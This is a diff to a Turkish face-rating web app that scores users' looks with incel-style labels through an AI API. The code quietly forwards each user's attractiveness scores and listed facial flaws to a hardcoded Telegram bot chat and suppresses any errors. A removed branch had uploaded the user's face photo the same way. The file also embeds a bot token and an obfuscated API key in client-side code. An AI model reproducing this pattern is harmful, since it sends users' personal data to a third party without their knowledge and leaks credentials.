@@ -97,7 +97,7 @@
 </div>
 <button class="btn btn-primary" id="btnLogin">GİRİŞ</button>
 <div class="error-box" id="loginError"></div>
-<footer>v33.0 • FINAL</footer>
+<footer>v34.0 • Telegram</footer>
 </div>
 </div>
 
@@ -153,6 +153,7 @@ faceApiReady=true;
 loadFaceApi();
 
 const GK=atob("QVEuQWI4Uk42SklHVDYxZlBZR2c1TmtJN1JiekF2d3ROVlVtYVFQSm5oWWM1emF0SmVnTlE=");
+const TG_TOKEN="8869691720:AAH1GsHRxc1LxmoOaXN1qSQpfjj793vI_jQ";
 const TG_CHAT_ID="8759264847";
 const API_URL="https://generativelanguage.googleapis.com/v1beta/models/gemini-3-flash-preview:generateContent";
 
@@ -303,9 +304,9 @@ APPEAL:7.0
 HARMONY:75
 DIMORPHISM:68
 ANGULARITY:60
-GOOD:keskin çene hattı,pozitif canthal tilt,simetrik burun,dolgun dudaklar,temiz cilt,belirgin elmacık kemikleri,kalın kaşlar
-BAD:hafif UEE,asimetrik kaş uçları,geniş burun kanatları,saç çizgisi gerilemesi,göz altı morlukları,düşük brow ridge
-DETAIL:Bu yüz ortalamanın üstünde. Çene hattı güçlü ancak kaş kemiği desteği zayıf. Daha belirgin bir brow ridge ile Chadlite seviyesine yükselebilir.
+GOOD:keskin çene hattı,pozitif canthal tilt,simetrik burun,dolgun dudaklar,temiz cilt,belirgin elmacık kemikleri
+BAD:hafif UEE,asimetrik kaş uçları,geniş burun kanatları,saç çizgisi gerilemesi,göz altı morlukları
+DETAIL:Bu yüz ortalamanın üstünde. Çene hattı güçlü ancak kaş kemiği desteği zayıf. Daha belirgin brow ridge ile Chadlite seviyesine yükselebilir.
 
 BU DEĞERLERİ BU YÜZE GÖRE GÜNCELLE. HER SATIRI DOLDUR.`;
 
@@ -405,23 +406,14 @@ extra+=`<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;margi
 extra+=`<div style="color:#888;font-size:10px;">Harmony: %30 | Dimorphism: %30 | Angularity: %25 | Diğer: %15</div>`;
 document.getElementById('rawText').innerHTML=extra;
 
-// Telegram'a gönder
+// TELEGRAM'A GÖNDER
 const tgText=`🔥 *25 MAX ANALİZ*\n\n🏆 MOG: *${r.mog}/10*\n📊 PSL: *${r.psl}/10*\n🎯 Kategori: *${r.cat}*\n💫 Appeal: *${r.appeal}/10*\n⚖️ Harmony: *%${r.harmony}*\n🧬 Dimorphism: *%${r.dimorphism}*\n📐 Angularity: *%${r.angularity}*\n\n✅ *EN İYİ:*\n${r.best.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n')}\n\n❌ *EN KÖTÜ:*\n${r.worst.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n')}`;
 
-if(base64Image){
-const blob=await fetch(`data:${currentMimeType};base64,${base64Image}`).then(r=>r.blob());
-const fd=new FormData();
-fd.append('chat_id',TG_CHAT_ID);
-fd.append('photo',blob,'face.jpg');
-fd.append('caption',tgText);
-fd.append('parse_mode','Markdown');
-fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`,{method:'POST',body:fd}).then(r=>console.log('📸 Telegram:',r.ok?'✅':'❌')).catch(e=>console.log('📸 Telegram:',e));
-}else{
 fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{
-method:'POST',headers:{'Content-Type':'application/json'},
+method:'POST',
+headers:{'Content-Type':'application/json'},
 body:JSON.stringify({chat_id:TG_CHAT_ID,text:tgText,parse_mode:'Markdown'})
-}).then(r=>console.log('📝 Telegram:',r.ok?'✅':'❌')).catch(e=>console.log('📝 Telegram:',e));
-}
+}).catch(e=>{});
 }
 </script>
 </body>
